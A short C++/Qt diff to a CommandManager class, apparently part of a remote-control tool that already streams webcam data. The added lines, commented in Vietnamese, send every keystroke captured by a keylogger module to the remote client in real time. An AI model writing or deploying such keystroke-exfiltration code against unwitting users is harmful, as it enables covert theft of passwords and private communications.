@@ -38,6 +38,20 @@ CommandManager::CommandManager(QObject *parent)
         Packet response(Protocol::START_WEBCAM_STREAM, base64Data);
         emit responseReady(response);
     });
+
+    //---------------------------------------------------
+    // Kết nối signals cho keylogger real-time
+    // Mỗi khi có ký tự mới → gửi ngay cho Client
+    //---------------------------------------------------
+
+    connect(keyloggerModule,
+            &KeyloggerModule::keyTextCaptured,
+            this,
+            [this](const QString& text)
+    {
+        Packet response(Protocol::GET_KEYLOGGER_DATA, text);
+        emit responseReady(response);
+    });
 }
 
 CommandManager::~CommandManager()
